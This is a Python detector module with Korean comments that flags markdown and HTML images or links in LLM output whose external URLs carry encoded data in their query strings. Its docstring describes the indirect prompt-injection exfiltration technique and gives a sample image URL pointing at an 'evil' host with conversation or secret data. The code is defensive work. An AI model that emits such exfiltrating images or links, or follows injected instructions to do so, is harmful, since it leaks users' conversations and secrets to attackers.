"""데이터 유출(exfiltration) 탐지 — LLM 출력의 마크다운/HTML 이미지·링크가 외부 URL 쿼리로
데이터를 실어 나르는 zero-click/click 유출 벡터.

간접 프롬프트 인젝션의 대표 유출 수법: 오염 문서가 모델에게 `![](https://evil/log?d=<대화·비밀>)`
같은 마크다운 이미지를 출력하게 하면, 렌더링 순간 브라우저가 evil 로 데이터를 실어 GET → 유출.
에이전틱 RAG(풀스토리·세이프)에서 실누출 경로. 공개 markdown exfiltration 탐지 패턴을 한국어 배포
환경에 맞게 보수적으로 조정했다.

정밀 우선: 외부 http(s) URL 이 **데이터 payload 로 보이는 쿼리 값**(긴 토큰/base64/hex)을 가질 때만
발동한다. 평범한 `![logo](https://site/logo.png)`(쿼리 없음)·정상 링크는 잡지 않는다.
이미지=zero-click(HIGH), 링크=클릭 필요(MEDIUM). 원본 텍스트 대상(URL 은 ASCII).
"""
from __future__ import annotations

import re
import urllib.parse

from ..result import Category, Severity, Violation

# 마크다운 이미지 ![alt](url) / HTML <img src="url"> / 마크다운 링크 [text](url)
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")
_HTML_IMAGE = re.compile(r"<img\b[^>]*?\bsrc\s*=\s*['\"]?(?P<url>[^'\">\s]+)", re.IGNORECASE)
_MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")

_TOKEN = re.compile(r"^[A-Za-z0-9_\-./%+=]+$")


def _is_encoded_blob(value: str) -> bool:
    """값이 인코딩된 데이터 blob(base64/hex/urlsafe 토큰)인가 — 자연어 아님.
    세션ID·비밀·base64 대화 등 exfil 페이로드. 한국어 검색어(자연어)는 제외."""
    v = value.strip()
    if len(v) < 20:
        return False
    if "%" in v:
        return False  # 퍼센트-인코딩(자연어일 수 있음)은 여기서 제외 → 이미지 경로에서 별도 처리
    if not _TOKEN.match(v):
        return False
    alnum = sum(c.isalnum() for c in v)
    return alnum >= 20 and alnum / len(v) >= 0.85


def _url_exfil(url: str, zero_click: bool) -> bool:
    """URL 이 외부 http(s) 이고 데이터 payload 쿼리를 실으면 True.

    zero_click=True(이미지)면 공격적: 인코딩 blob 또는 짙은 퍼센트-인코딩(데이터) 모두.
    zero_click=False(링크)면 보수적: base64/hex blob 만(한국어 검색 등 자연어 %인코딩 FP 방지).
    """
    try:
        u = urllib.parse.urlsplit(url)
    except ValueError:
        return False
    if u.scheme.lower() not in ("http", "https") or not u.query:
        return False
    for raw_pair in u.query.split("&"):
        raw_val = raw_pair.split("=", 1)[1] if "=" in raw_pair else raw_pair
        if _is_encoded_blob(raw_val):
            return True
    # 이미지(zero-click)만: 짙은 퍼센트-인코딩 데이터도 유출로 간주(값이 충분히 김).
    if zero_click:
        for raw_pair in u.query.split("&"):
            raw_val = raw_pair.split("=", 1)[1] if "=" in raw_pair else raw_pair
            if raw_val.count("%") >= 6 and len(raw_val) >= 30:
                return True
    return False


def scan_data_exfil(text: str) -> list[Violation]:
    out: list[Violation] = []
    seen: set[tuple[int, int]] = set()

    def add(m: re.Match[str], kind: str, sev: Severity, zero_click: bool) -> None:
        url = m.group("url")
        if not _url_exfil(url, zero_click):
            return
        span = (m.start(), m.end())
        if span in seen:
            return
        seen.add(span)
        out.append(Violation(
            code=f"markdown_exfil_{kind}",
            category=Category.DATA_EXFIL,
            severity=sev,
            reason=f"data exfiltration via {kind} to external URL with data payload",
            start=m.start(),
            end=m.end(),
            matched=url[:80],
        ))

    for m in _MD_IMAGE.finditer(text):
        add(m, "image", Severity.HIGH, True)   # zero-click(렌더 즉시) → BLOCK 급
    for m in _HTML_IMAGE.finditer(text):
        add(m, "html_image", Severity.HIGH, True)
    for m in _MD_LINK.finditer(text):
        add(m, "link", Severity.MEDIUM, False)  # 클릭 필요 → FLAG
    return out
